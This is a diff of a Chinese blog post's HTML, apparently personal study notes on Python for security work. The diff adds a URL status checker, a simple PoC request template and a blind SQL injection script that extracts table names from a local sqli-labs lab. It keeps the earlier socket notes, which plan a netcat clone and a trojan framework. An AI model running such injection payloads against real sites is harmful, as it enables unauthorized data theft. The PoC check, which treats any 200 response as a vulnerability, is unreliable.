@@ -95,7 +95,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">6k</span>
+            <span class="post-count">6.6k</span>
         </span>
     </span>
 
@@ -104,7 +104,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">29 分钟</span>
+            <span class="post-count">32 分钟</span>
         </span>
     </span>
 </div>
@@ -120,7 +120,47 @@
     <div class="article-entry" itemprop="articleBody">
        
   <p>wingide personal 9_9.1 </p>
-<h1 id="1-socket模块"><a href="#1-socket模块" class="headerlink" title="1.socket模块"></a>1.socket模块</h1><p>客户端、服务端，TCP代理的编写；然后完善成自己的netcat，最后完成一个命令行shell工具编写。为了后续编写主机发现工具，实现跨平台嗅探、创建木马框架。</p>
+<h1 id="1-poc编写"><a href="#1-poc编写" class="headerlink" title="1.poc编写"></a>1.poc编写</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#输入点确定</span></span><br><span class="line"><span class="comment">#构造恶意输入</span></span><br><span class="line"><span class="comment">#目标检验</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#1.url处理</span></span><br><span class="line"><span class="comment">#前缀协议的增删、结尾/的删除</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_url</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url.startswith(<span class="string">&#x27;http://&#x27;</span>) <span class="keyword">and</span> <span class="keyword">not</span> url.startswith(<span class="string">&#x27;https://&#x27;</span>):</span><br><span class="line">        url=<span class="string">&#x27;http://&#x27;</span>+url</span><br><span class="line"></span><br><span class="line">    <span class="comment">#只获取域名部分</span></span><br><span class="line">    url_paths=url.split(<span class="string">&#x27;/&#x27;</span>) <span class="comment">#如[http, ,www.ip,path,to,file] </span></span><br><span class="line">    <span class="comment">#有空的部分是因为 http://，有两个/，第二个/分割后没有值</span></span><br><span class="line">    url_without_path=<span class="string">&#x27;/&#x27;</span>.join(url_paths[:<span class="number">3</span>])<span class="comment">#列表第0,1,2元素</span></span><br><span class="line">    <span class="comment">#删除&quot;/&quot;</span></span><br><span class="line">    <span class="keyword">if</span> url_without_path.endswith(<span class="string">&#x27;/&#x27;</span>):</span><br><span class="line">        url_without_path=url_without_path[:-<span class="number">1</span>] <span class="comment">#开头到倒数第二个字符</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> url_without_path</span><br><span class="line"><span class="comment">#2.状态码识别 导入requests库</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getcode</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response=requests.get(url)</span><br><span class="line">        <span class="keyword">return</span> response.status_code</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"><span class="comment">#3.文件读取 批量漏洞验证，即读取多个url</span></span><br><span class="line"><span class="comment">#line.strip()去除该行的首尾空白字符（包括换行符）。</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getfile</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            urls=[line.strip() <span class="keyword">for</span> line <span class="keyword">in</span> file.readlines()] <span class="comment">#列表推到式 </span></span><br><span class="line">        <span class="keyword">return</span> urls</span><br><span class="line">    <span class="keyword">except</span> IOError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;无法读取文件&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span>[]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment">#读取url列表</span></span><br><span class="line">    filename=<span class="built_in">input</span>(<span class="string">&quot;url文件名&quot;</span>)</span><br><span class="line">    urls=getfile(filename)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(urls)==<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;没呀&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">        process_url=process_url(url)<span class="comment">#处理成域名</span></span><br><span class="line">        status_code=getcode(process_url)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;\n<span class="subst">&#123;process_url&#125;</span>\n状态码:<span class="subst">&#123;status_code&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong>response方法</strong></p>
+<table>
+<thead>
+<tr>
+<th>response.status_code</th>
+<th>相应的状态码</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>response.json()</td>
+<td>响应体的特殊字段</td>
+</tr>
+<tr>
+<td>response.text</td>
+<td>响应体里的文本内容</td>
+</tr>
+<tr>
+<td>response.headers</td>
+<td>响应头字段</td>
+</tr>
+<tr>
+<td>response.elapsed</td>
+<td>响应包的响应时间</td>
+</tr>
+<tr>
+<td>response.content</td>
+<td>响应体的二进制数据</td>
+</tr>
+</tbody></table>
+<h2 id="poc验证"><a href="#poc验证" class="headerlink" title="poc验证"></a>poc验证</h2><h3 id="post"><a href="#post" class="headerlink" title="post"></a>post</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#4.poc post验证 如果是sql注入</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poc_post</span>(<span class="params">target</span>):</span><br><span class="line">    url=target+<span class="string">&quot;/&quot;</span></span><br><span class="line">    <span class="comment">#参数</span></span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;123&#x27;</span>, </span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;123&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">#头部</span></span><br><span class="line">    headers=&#123;</span><br><span class="line">          <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response=requests.post(url,data=data,headers=headers)</span><br><span class="line">        <span class="keyword">if</span> response.status_code==<span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;漏洞存在&quot;</span>)</span><br><span class="line">            <span class="comment">#可进一步处理漏洞</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;无漏洞&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;请求异常:&quot;</span>,e)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="get"><a href="#get" class="headerlink" title="get"></a>get</h3><p>data改为params即可</p>
+<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>以sqli-labs less 8为例</p>
+<p>二分查找当然更好</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://localhost:81/sqli/Less-8/?id=&quot;</span></span><br><span class="line">i=<span class="number">1</span></span><br><span class="line">name=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#substr从1开始</span></span><br><span class="line"><span class="keyword">while</span> i&lt;<span class="number">10</span>:</span><br><span class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>,<span class="number">128</span>):    </span><br><span class="line">       <span class="comment"># id=f&quot;1&#x27; and ascii(substr(database(),&#123;i&#125;,1))=&#123;j&#125;--+&quot;</span></span><br><span class="line">        <span class="built_in">id</span>=<span class="string">f&quot;1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 2,1),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>--+&quot;</span></span><br><span class="line">        target=url+<span class="built_in">id</span></span><br><span class="line">        response=requests.get(target)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;You&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            name=name+<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(name)</span><br><span class="line">            i=i+<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="2-socket模块"><a href="#2-socket模块" class="headerlink" title="2.socket模块"></a>2.socket模块</h1><p>客户端、服务端，TCP代理的编写；然后完善成自己的netcat，最后完成一个命令行shell工具编写。为了后续编写主机发现工具，实现跨平台嗅探、创建木马框架。</p>
 <h2 id="1-基本的tcp-c-x2F-s"><a href="#1-基本的tcp-c-x2F-s" class="headerlink" title="1.基本的tcp c&#x2F;s"></a>1.基本的tcp c&#x2F;s</h2><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">target_host=<span class="string">&quot;www.baidu.com&quot;</span></span><br><span class="line">target_port=<span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#socket对象的建立</span></span><br><span class="line">client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment">#客户端连接</span></span><br><span class="line">client.connect((target_host,target_port))</span><br><span class="line"></span><br><span class="line"><span class="comment">#发送数据</span></span><br><span class="line">client.send(<span class="string">b&quot;GET / HTTP/1.1\r\nHost:baidu.com\r\n\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#接收数据</span></span><br><span class="line">response=client.recv(<span class="number">4096</span>)<span class="comment">#只从服务端接收4096字节的数据</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <blockquote>
@@ -191,13 +231,13 @@
      #buffer=raw_input(&quot;&quot;)
      buffer=input(&quot;&quot;)
      buffer+=&quot;\n&quot;
-            
+                
      #发送出去
      client.send(buffer.encode())
      
      
      ....
-                 
+                     
       while b&quot;\n&quot; not in cmd_buffer:
 </code></pre>
 <p>  <strong>.send()和.recv()函数要的是字节型字符串，注意不要把字节型字符串与普通字符拼接。</strong></p>
@@ -381,9 +421,9 @@
       </a>
     
     
-      <a href="/2023/05/20/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/" class="article-nav-link">
+      <a href="/2023/05/20/sql%E6%B3%A8%E5%85%A5-tips/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">sql注入之联合注入</div>
+        <div class="article-nav-title">sql注入-tips</div>
       </a>
     
   </nav>
